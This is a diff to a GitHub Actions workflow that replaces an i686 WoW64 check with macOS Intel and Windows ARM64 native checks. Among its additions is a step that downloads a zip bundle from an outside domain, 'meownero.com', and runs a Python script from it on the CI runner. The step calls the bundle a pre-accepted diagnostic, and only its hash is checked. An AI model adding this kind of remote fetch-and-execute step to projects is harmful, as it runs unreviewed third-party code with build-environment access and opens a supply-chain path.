@@ -1,4 +1,4 @@
-name: TJS-1882 exact i686 WoW64 archive check
+name: TJS-1882 accepted Intel and ARM64 native checks
 on:
   push:
     branches: [tjs1882-native-windows-preflight]
@@ -6,7 +6,7 @@ on:
 permissions:
   contents: read
 concurrency:
-  group: tjs1882-native-${{ github.sha }}
+  group: tjs1882-remaining-native
   cancel-in-progress: false
 jobs:
   native:
@@ -15,10 +15,16 @@ jobs:
       max-parallel: 1
       matrix:
         include:
-          - target: windows-i686
-            runner: windows-2025
+          - target: macos-x86_64
+            runner: macos-15-intel
+            python_arch: x64
+            timeout: 30
+          - target: windows-aarch64
+            runner: windows-11-arm
+            python_arch: arm64
+            timeout: 40
     runs-on: ${{ matrix.runner }}
-    timeout-minutes: 30
+    timeout-minutes: ${{ matrix.timeout }}
     steps:
       - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09
         env:
@@ -31,9 +37,8 @@ jobs:
           persist-credentials: false
           sparse-checkout-cone-mode: false
           sparse-checkout: |
-            /ci/tjs1882/packages/
+            /ci/tjs1882/remaining-native/
             /vanguard/run-portable-ci.py
-            /vanguard/run-portable-journey-diagnostic.py
             /vanguard/ci-inputs.json
             /vanguard/test-portable-refusals.py
             /vanguard/run-portable-mac-check.py
@@ -42,20 +47,80 @@ jobs:
             /vanguard/tester-profile.json
       - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1
         with:
-          python-version: '3.13'
-          architecture: x64
-      - name: Exact i686 exception first, WoW64 journey and ten controls
+          python-version: '3.13.16'
+          architecture: ${{ matrix.python_arch }}
+      - name: Exact remapped archive native Intel journey and ten controls
+        if: matrix.target == 'macos-x86_64'
         shell: bash
         run: >-
           python -B vanguard/run-portable-ci.py
           --inputs vanguard/ci-inputs.json
-          --inputs-sha256 cbd2a202a74e143f7e3ac635cb6e0f4c369728c75c7017a5f376cdb5b75f6f8f
-          --target '${{ matrix.target }}'
+          --inputs-sha256 6edbf5277df9bb21ff507b194faf351240bfadb1650050982626a77f28ed0e8e
+          --target macos-x86_64
           --out "$RUNNER_TEMP/tjs1882-native"
-      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+      - name: Qualify native ARM64 Python and directory symlink fixture
+        if: matrix.target == 'windows-aarch64'
+        shell: python
+        run: |
+          import ctypes, json, os, pathlib, platform, sys
+          from ctypes import wintypes
+          root = pathlib.Path(os.environ['RUNNER_TEMP']) / 'tjs1882-arm'
+          root.mkdir()
+          target, link = root / 'fixture-target', root / 'fixture-link'
+          proof = {'result': 'FAIL', 'symlink_directory_created': False}
+          try:
+              assert os.name == 'nt' and platform.python_implementation() == 'CPython'
+              assert sys.version_info[:3] == (3, 13, 16) and ctypes.sizeof(ctypes.c_void_p) == 8
+              kernel = ctypes.WinDLL('kernel32', use_last_error=True, winmode=0x800)
+              current = kernel.GetCurrentProcess
+              current.restype, current.argtypes = wintypes.HANDLE, ()
+              query = kernel.IsWow64Process2
+              query.restype = wintypes.BOOL
+              query.argtypes = (wintypes.HANDLE, ctypes.POINTER(wintypes.USHORT), ctypes.POINTER(wintypes.USHORT))
+              process, native = wintypes.USHORT(), wintypes.USHORT()
+              assert query(current(), ctypes.byref(process), ctypes.byref(native))
+              proof.update(process_machine=process.value, native_machine=native.value)
+              assert process.value == 0 and native.value == 0xaa64
+              target.mkdir()
+              os.symlink(target, link, target_is_directory=True)
+              assert link.is_symlink() and link.is_dir()
+              proof.update(result='PASS_NATIVE_ARM64_SYMLINK_CAPABILITY', symlink_directory_created=True)
+          except OSError as error:
+              proof['winerror'] = error.winerror
+              raise
+          finally:
+              if link.is_symlink(): link.unlink()
+              if target.is_dir(): target.rmdir()
+              (root / 'qualification.json').write_text(json.dumps(proof, indent=2))
+      - name: Run unchanged independently accepted Windows diagnostic bundle
+        if: matrix.target == 'windows-aarch64'
+        shell: pwsh
+        run: |
+          $bundle = Join-Path $env:RUNNER_TEMP 'tjs1882-arm/bundle.zip'
+          Invoke-WebRequest -Uri 'https://meownero.com/downloads/artifacts/meownero-windows-test-diagnostics-v2.zip' -OutFile $bundle -TimeoutSec 120
+          if ((Get-Item $bundle).Length -ne 164120029) { throw 'Bundle length mismatch' }
+          if ((Get-FileHash $bundle -Algorithm SHA256).Hash.ToLowerInvariant() -ne 'bedd371bc042ec2b893e45693083eae64637ca1a1f496933f2f90a5bf6f38034') { throw 'Bundle hash mismatch' }
+          Expand-Archive -LiteralPath $bundle -DestinationPath (Join-Path $env:RUNNER_TEMP 'tjs1882-arm/extract')
+          python -B (Join-Path $env:RUNNER_TEMP 'tjs1882-arm/extract/meownero-windows-test/windows-test-bundle.py')
+          exit $LASTEXITCODE
+      - name: Bound public evidence upload
+        id: evidence
         if: always()
+        shell: python
+        run: |
+          import os, pathlib
+          root = pathlib.Path(os.environ['RUNNER_TEMP'])
+          files = list(root.glob('tjs1882-native/public/*.json')) + list(root.glob('tjs1882-arm/qualification.json')) + list(root.glob('tjs1882-arm/extract/meownero-windows-test/run-*/report.zip'))
+          assert all(p.is_file() and not p.is_symlink() for p in files)
+          assert sum(p.stat().st_size for p in files) <= 10 * 1024**2
+          with open(os.environ['GITHUB_OUTPUT'], 'a') as stream: stream.write('safe=true\n')
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        if: always() && steps.evidence.outputs.safe == 'true'
         with:
           name: tjs1882-${{ matrix.target }}-${{ github.run_id }}
-          path: ${{ runner.temp }}/tjs1882-native/public/*.json
+          path: |
+            ${{ runner.temp }}/tjs1882-native/public/*.json
+            ${{ runner.temp }}/tjs1882-arm/qualification.json
+            ${{ runner.temp }}/tjs1882-arm/extract/meownero-windows-test/run-*/report.zip
           if-no-files-found: warn
           retention-days: 3
